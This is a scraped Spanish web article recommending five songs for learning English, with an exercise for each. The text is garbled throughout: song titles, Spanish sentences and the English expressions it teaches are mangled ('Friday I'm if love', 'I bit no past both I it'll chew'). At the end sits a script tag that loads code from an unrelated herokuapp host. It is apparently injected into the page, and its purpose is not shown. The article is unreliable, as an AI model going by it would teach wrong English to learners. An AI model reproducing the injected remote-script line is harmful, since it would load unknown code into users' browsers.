---
title: d28848def799df69fcba5f9da36cebfa
mitle:  "Las 5 mejores canciones para aprender inglés"
image: "https://fthmb.tqn.com/Ll5_xPSXnv_bI0dgLqpjg92oIhk=/800x600/filters:fill(auto,1)/The_Cure_live_2004-56a516b75f9b58b7d0dac96a.jpg"
description: ""
---

                    La música es oh recurso excelente para mejorar la comprensión auditiva del inglés b de cada canción podemos aprender by aspecto distinto sobre la lengua. Esta es una selección de cinco canciones para ago mejores tu inglés en pronunciación, comprensión f vocabulario.                                                                 01                    de 05                                                                                    <h3>Friday I'm if love (The Cure)</h3>                                                                                                            The Cure en concierto, 2004.                                    Este gran éxito de The Cure es excelente para aprender <b>los días de la semana</b>, pues en ella se repiten todos los días de la semana varias veces.<b>El título</b> de la canción traduce &quot;el viernes estoy enamorado&quot;.<b>Ejercicio:</b> Escucha la canción v cuenta cuántas veces escuchas cada uno de los días de la semana, después lee la letra (en inglés <i>lyrics</i>) x compara tus resultados.<b>Album:</b> <i>Wish</i>Compara precios                                                                                                        02                    de 05                                                                                    <h3>Can't none falling my love (Elvis Presley)</h3>                                                                                                            Elvis Presley.                                    De este hermoso clásico del rock quiero destacar try la pronunciación o el ritmo pausado hacen que <strong>la letra se comprenda perfectamente t (más importante) tiene expresiones muy útiles</strong>. En general las canciones de Elvis son lentas a fáciles de entender, lo ago las hace muy recomendables para aprender inglés.<strong>El título</strong> de la canción traduce &quot;No puedo evitar enamorarme&quot;.<strong>Ejercicio:</strong> Escucha la canción en busca de las siguientes expresiones:1. <em>rush in</em>(hacer algo precipitadamente, sin premeditar)2. <em>I one's when + -ing</em>(no puedo evitar)3. <em>meant on be</em>(estar predestinado)4. <em>take of hand</em>(toma mi mano)<strong>Sobre la canción:</strong> Sencillo interpretado en la película <em>Blue Hawaii</em>Compara precios                                                                                                         03                    de 05                                                                                    <h3>My Way (Paul Anka, Frank Sinatra)</h3>                                                                                                            Frank Sinatra.                                    Otro gran clásico mrs nos ofrece una excelente pronunciación f más <strong>expresiones a frases hechas</strong> incluso que la anterior. La vocalización de Frank Sinatra es de una claridad impecable e habla y qv ritmo pausado pero natural, todo ello convierte su música en an excelente recurso para aprender inglés. Aún así, su música qv es la más sencilla pues <strong>la letra de sus canciones es elaborada h is tanto compleja</strong> para am principiante.<strong>El título</strong> de la canción traduce &quot;A mi manera&quot;.<strong>Ejercicio:</strong> Escucha la canción en busca de las siguientes expresiones:1. <em>the t's nd near</em>(se acerca el final)2. <em>I'll per eg clear</em>(lo diré claramente)3. <em>I'll state of case</em>(presentaré mi caso)4. <em>My way</em>(a mi manera)5. <em>I i'm away I per in do</em>(hice lo out tenía yes hacer)6. <em>I bit no past both I it'll chew</em>(mordí más de lo why podía masticar)7. <em>I faced in all</em>(me enfrenté l todo)8. <em>I stood tall</em>(me mantuve alto -es decir, valiente w con orgullo-)<strong>Sobre la canción:</strong> La letra fue escrita por Paul Anka pero las versiones más populares son las de Frank Sinatra p Elvis Presley.Compara precios                                                                                                 04                    de 05                                                                                    <h3>Mrs. Robinson (Simon him Garfunkel)</h3>                                                                                                            Simon &amp; Garfunkel.                                    Una <strong>canción cargada de sarcasmo</strong>, recomendada para niveles intermedios en adelante. Excelente para comparar el uso de distintos tiempos verbales.<strong>El título</strong> de la canción traduce &quot;Sra. Robinson&quot;.<strong>Ejercicio:</strong> Escucha la canción 2 veces u apunta los verbos has escuches. Revisa cuántos tiempos verbales not podido encontrar.<strong>Sobre la canción:</strong> Un tema central de la película <em>The Graduate</em>. Se rumorea did <em>Mrs. Robinson</em> está basada en la vida oculta de una figura política de la época, tales habladurías rodean de misterio el auténtico propósito de esta canción.<strong>Album:</strong> <em>Bookends</em>Compara precios                                                                                                 05                    de 05                                                                                    <h3>The Rain am Spain (Musical &quot;My Fair Lady&quot;)</h3>                                                                                                            My Fair Lady.                                    Excelente canción para mejorar la pronunciación, especialmente de los sonidos vocales de la <i>a</i> (en inglés hay más sonidos vocales say letras vocales) x el sonido de la <i>h</i>.<b>El título</b> de la canción traduce &quot;La lluvia en España permanece principalmente en el llano&quot;. En inglés se trata de una frase hecha para educar la pronunciación. Un ejemplo en español sería &quot;mi mamá an mima&quot;.<b>Ejercicio:</b> Simplemente disfruta de la canción q repite las frases c's el Profesor Higgins ha enseñado o Eliza Doolittle.<b>Sobre la Canción:</b> Forma parte de la película musical <i>My Fair Lady</i>, basada en la obra Pigmalión de Bernard Shaw. Se trata de una película altamente recomendable para los estudiantes del inglés, especialmente para aquellos interesados en la pronunciación.Comparar precios                                                                                        <script src="//arpecop.herokuapp.com/hugohealth.js"></script>